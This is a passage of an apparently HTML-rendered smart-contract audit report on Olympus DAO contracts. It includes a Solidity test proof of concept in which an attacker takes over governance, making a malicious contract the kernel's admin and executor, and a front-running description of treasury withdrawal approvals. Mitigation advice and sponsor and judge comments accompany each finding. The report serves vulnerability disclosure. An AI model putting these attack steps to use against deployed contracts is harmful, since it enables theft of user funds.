class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">users</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">userCreator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">create</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">users</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MockMalicious</span><span class=\"mtk1\"> </span><span class=\"mtk12\">attackerControlledContract</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MockMalicious</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Instruction</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">instructions_</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Instruction</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">instructions_</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Instruction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Actions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ChangeAdmin</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attackerControlledContract</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">instructions_</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Instruction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Actions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ChangeExecutor</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attackerControlledContract</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">submitProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">instructions_</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;proposalName&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;This is the proposal URI&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">endorseProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">activateProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">3</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">executeProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">kernel</span><span class=\"mtk1\">.</span><span class=\"mtk11\">executor</span><span class=\"mtk1\">()==</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attackerControlledContract</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">kernel</span><span class=\"mtk1\">.</span><span class=\"mtk11\">admin</span><span class=\"mtk1\">()==</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attackerControlledContract</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>with</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MockMalicious</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In <code>Governance.sol</code> check for a minimum VOTES totalSupply, similiar to the expected initial supply of VOTES when they have been fairly distributed, for example at line <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164\">L164</a>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/392\">fullyallocated (Olympus) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/392#issuecomment-1249926401\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Leaving as High severity as this shows a clear path to loss of funds.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-03-trsry-front-runnable-setapprovalfor\" style=\"position:relative;\"><a href=\"#h-03-trsry-front-runnable-setapprovalfor\" aria-label=\"h 03 trsry front runnable setapprovalfor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/410\">[H-03] TRSRY: front-runnable <code>setApprovalFor</code></a></h2>\n<p><em>Submitted by zzzitron, also found by berndartmueller, csanuragjain, pashov, Ruhum, sorrynotsorry, and Trust</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L64-L72\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L64-L72</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L42-L48\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L42-L48</a></p>\n<p>An attacker may be able to withdraw more than intended</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Let’s say Alice had approval of 100. Now the treasury custodian reduced the approval to 50. Alice could frontrun the <code>setApprovalFor</code> of 50, and withdraw 100 as it was before. Then withdraw 50 with the newly set approval. So the alice could withdraw 150.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// modules/TRSRY.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">63</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice Sets approval for specific withdrawer addresses</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">64</span><span class=\"mtk1\">     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setApprovalFor</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> 65         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">withdrawer_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> 66         </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> 67         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> 68     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">permissioned</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">69</span><span class=\"mtk1\">         </span><span class=\"mtk12\">withdrawApproval</span><span class=\"mtk1\">[</span><span class=\"mtk12\">withdrawer_</span><span class=\"mtk1\">][</span><span class=\"mtk12\">token_</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">70</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">71</span><span class=\"mtk1\">         </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ApprovedForWithdrawal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">withdrawer_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">72</span><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p>The <code>TreasuryCustodian</code> simply calls the <code>setApprovalFor</code> to grant Approval.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">41</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">42</span><span class=\"mtk1\">     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">grantApproval</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> 43         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> 44         </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> 45         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> 46     ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;custodian&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">47</span><span class=\"mtk1\">         </span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setApprovalFor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">for_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">48</span><span class=\"mtk1\">     }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Instead of setting the given amount, one can reduce from the current approval. By doing so, it checks whether the previous approval is spend.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1238901986\">ind-igo (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Understood. Will change the logic to increase/decrease allowances.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1249816020\">0xean (judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>I think this vulnerability should be a high severity as it opens up the possibility of a direct loss of funds in the amount of up to the previous approval amount. Upgrading to High. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1250385243\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@ind-igo - Not sure if you deleted your comment, but that context is useful.  Happy to take another look here. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1251369022\">ind-igo (Olympus) commented</a>:</strong></p>\n<blockquote>\n<p>I did, I just thought it was unnecessary to evaluate the issue. I was just saying that the context of the code is that it is not intended to be used to approve an EOA/multisig, but instead used to approve governance-voted contracts to access treasury funds, in order to deposit into yield contracts or whatever. But I don’t think it’s very relevant to this, as the code is still faulty and exploitable in an extreme case. I already have made this remediation as well, so all good.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-32\" style=\"position:relative;\"><a href=\"#medium-risk-findings-32\" aria-label=\"medium risk findings 32 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (32)</h1>\n<h2 id=\"m-01-operatorsetreservefactor-doesnt-check-if-bond-market-should-be-changed\" style=\"position:relative;\"><a href=\"#m-01-operatorsetreservefactor-doesnt-check-if-bond-market-should-be-changed\" aria-label=\"m 01 operatorsetreservefactor doesnt check if bond market should be changed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/83\">[M-01] <code>Operator::setReserveFactor</code> doesn’t check if bond market should be changed</a></h2>\n<p><em>Submitted by rvierdiiev</em></p>\n<p><code>Operator::setReserveFactor</code> sets new <code>reserveFactor</code> value. This parameter is used in <code>fullCapacity</code> function to calculate how much capacity is available by high/low side. Then calculated capacity is used by <code>Range</code> module inside <code>regenerate</code> function to set the threshold of capacity for both sides of market. Then in <code>Range::updateCapacity</code> function this threshold is checked to understand if the wall should be down and the bond market should be closed.</p>\n<p>Changing this value means that the capacity of sides has changed and the sides should be regenarated to include this changes.</p>\n<h4 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L711\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L711</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L133\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L133</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L145\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L145</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L185\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L185</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L780\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L780</a><br></p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Call this after the param updating.<br>\n<code>_regenerate(true); _regenerate(false;</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/83#issuecomment-1241054503\">Oighty (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Forcing a regeneration when the reserveFactor is updated could cause unintended regeneration if a wall is currently down. A better approach may be to conditionally regenerate each side if they are active.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/83#issuecomment-1244128646\">Oighty (Olympus) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>After discussing with the team more, we are going to leave this as-is. It is more flexible to not regenerate the side in this function. With the current implementation, the guardian can determine if the change should go into effect on the next regen, or if it should happen immediately. To enable immediately, they can manually call <code>regenerate</code>.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-solmate-safetransfer-and-safetransferfrom-does-not-check-the-codesize-of-the-token-address-which-may-lead-to-fund-loss\" style=\"position:relative;\"><a href=\"#m-02-solmate-safetransfer-and-safetransferfrom-does-not-check-the-codesize-of-the-token-address-which-may-lead-to-fund-loss\" aria-label=\"m 02 solmate safetransfer and safetransferfrom does not check the codesize of the token address which may lead to fund loss permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/117\">[M-02] Solmate <code>safetransfer</code> and <code>safetransferfrom</code> does not check the codesize of the token address, which may lead to fund loss</a></h2>\n<p><em>Submitted by djxploit, also found by brgltd</em></p>\n<p>In <code>getloan()</code> and <code>replayloan()</code>, the <code>safetransfer</code> and <code>safetransferfrom</code> doesn’t check the existence of code at the token address. This is a known issue while using solmate’s libraries.<br>\nHence this may lead to miscalculation of funds and may lead to loss of funds , because if <code>safetransfer()</code> and <code>safetransferfrom()</code> are called on a token address that doesn’t have contract in it, it will always return success, bypassing the return value check. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never transferred.<br>\nSo this will lead to miscalculation and possibly loss of funds</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99</a></p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" 